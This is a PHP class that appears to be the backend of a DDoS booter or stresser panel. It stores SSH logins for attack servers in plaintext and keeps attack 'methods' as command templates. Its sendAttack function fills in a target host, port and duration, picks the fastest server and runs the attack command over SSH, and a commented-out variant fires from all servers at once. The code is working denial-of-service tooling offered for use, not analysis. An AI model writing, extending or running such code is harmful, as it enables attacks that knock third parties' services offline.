<?php

class server
{
    /* 
     * Server Related Functions
     */ 
    public function addServer($ip, $username, $password)
    {
        try
        {
            $conn = database::getConnection();
            $stmt = $conn->prepare('INSERT INTO servers (ip, username, password) VALUES (?, ?, ?)');
            $stmt->execute(array($ip, $username, $password));
        }
        catch(PDOException $error)
        {
            return $error->getMessage();
        }
    }
    
    public function installServer($ip, $username, $password)
    {
       $cmd = $this->getMethod('INSTALL');
       $this->sendCommand($ip, $username, $password, $cmd['command']);

       
    }
    
    public function getServers()
    {
        try
        {
            $conn = database::getConnection();
            $stmt = $conn->prepare("SELECT * FROM servers");
            $stmt->execute();
            $result = $stmt->fetchAll();
        
            return $result;
        }
        catch(PDOException $error)
        {
            return $error->getMessage();
        }
    }
    
    public function deleteServer($id)
    {
        try
        {
            $conn = database::getConnection();
            $stmt = $conn->prepare("DELETE FROM servers WHERE id = ?");
            $stmt->execute(array($id));
        }
        catch(PDOException $error)
        {
            return $error->getMessage();
        }
    }
    
    public function isOnline($ip)
    {
            $fp = fsockopen($ip, 22, $errno, $errstr, 10);
            $status = (!$fp ? 'offline' : 'online');
            
            return $status;
    }
    
    public function updateServers()
    {
        $servers = $this->getServers();
        
        foreach($servers as $server)
        {
            $status = $this->isOnline($server['ip']);
            $response = $this->responseTime($server['ip']);
            $_response = explode('>', $response);

            $conn = database::getConnection();
            $stmt = $conn->prepare('UPDATE servers SET response = ? WHERE ip = ?');
            $stmt->execute(array(rtrim($_response[2], "</font"), $server['ip']));
        }
    }
    
      
    public function responseTime($ip)
    {
            $start = microtime(true);
            $fp = fsockopen($ip, 22, $errno, $errstr, 10);
            
            if(!$fp)
            {
                return '<b><font color="red">offline</font></b>';
            }
            else
            {
                $load = microtime(true) - $start;
                $final = $load * 1000;
                return '<b><font color="green">'.round($final).'</font></b>';
            }
    }
    
    
    /* 
     * Method Related Functions 
     */ 
    public function getMethod($name)
    {
        try
        {
            $conn = database::getConnection();
            $stmt = $conn->prepare('SELECT * FROM methods WHERE name = ?');
            $stmt->execute(array(strtoupper($name)));
            return $stmt->fetch(PDO::FETCH_ASSOC);
        } 
        catch (PDOException $error) 
        {
            return $error->getMessage();
        }
    }
    
    public function getMethods()
    {
        try
        {
            $conn = database::getConnection();
            $stmt = $conn->prepare('SELECT * FROM methods');
            $stmt->execute();
            return $stmt->fetchAll();
        } 
        catch (PDOException $error) 
        {
            return $error->getMessage();
        }
    }
    
    public function addMethod($name, $command, $layer)
    {
        try
        {
            $conn = database::getConnection();
            $stmt = $conn->prepare('INSERT INTO methods (name, classification, command) VALUES (?, ?, ?)');
            $stmt->execute(array($name, $layer, $command));
        } 
        catch (PDOException $error) 
        {
            return $error->getMessage();
        }
    }
    
    public function editMethod($name, $command)
    {
        try
        {
            $conn = database::getConnection();
            $stmt = $conn->prepare('UPDATE methods SET command = ? WHERE name = ?');
            $stmt->execute(array($command, $name));
        } 
        catch (PDOException $error) 
        {
            return $error->getMessage();
        }
    }
    
    public function deleteMethod($id)
    {
        try
        {
            $conn = database::getConnection();
            $stmt = $conn->prepare("DELETE FROM methods WHERE id = ?");
            $stmt->execute(array($id));
        }
        catch(PDOException $error)
        {
            return $error->getMessage();
        }
    }
    
    public function allowedMethod($method)
    {
        try
        {
            $dbh = database::getConnection();
            $stmt = $dbh->prepare('SELECT * FROM `methods` WHERE `name` = :method LIMIT 1');
            $stmt->execute(array(':method' => $method));
            $result = $stmt->fetch();
            
            if($result)
            {
                return true;
            }
        }
            
        catch(PDOException $error)
        {
            return $error->getMessage();
        }
    }
    
      public function addParameters($host, $port, $time, $command)
    {
    	$main = $command['command'];

    		if(!strpos($main, '[port]'))
    		{
    			$_command = str_replace('[host]', $host, $main);
    			$_command2 = str_replace('[time]', $time, $_command);
    			return $_command2;
    		}
    		else
    		{
    			$_command = str_replace('[host]', $host, $main);
    			$_command2 = str_replace('[port]', $port, $_command);
    			return str_replace('[time]', $time, $_command2);
    		}
    }
    
    /* 
     * Attack Related Functions 
     */                        
    public function sendAttack($ip, $port, $time, $method)
    {
        $server = $this->serverRotation();
        $rawcommand = $this->getMethod($method);
        $command = $this->addParameters($ip, $port, $time, $rawcommand);
        return $this->sendCommand($server['ip'], $server['username'], $server['password'], $command);
        

        /*$servers = $this->getServers();
        $rawcommand = $this->getMethod($method);
        $command = $this->addParameters($ip, $port, $time, $rawcommand);
        foreach($servers as $server)
        {
        	$this->sendCommand($server['ip'], $server['username'], $server['password'], $command);
        }
        */
    }
    
    public function sendCommand($ip, $username, $password, $command)
    {
        $handler = new Net_SSH2($ip);
        if(!$handler->login($username, $password))
        {
            return false;
        }
        else
        {
           $handler->setTimeout(10);
           return $handler->exec($command);
        }
    }

public function serverRotation()
{
    $conn = database::getConnection();
    $stmt = $conn->prepare('SELECT * FROM `servers` ORDER BY `response` ASC LIMIT 1');
    $stmt->execute();
    $result = $stmt->fetch(PDO::FETCH_ASSOC);

    return $result;
}


}
?>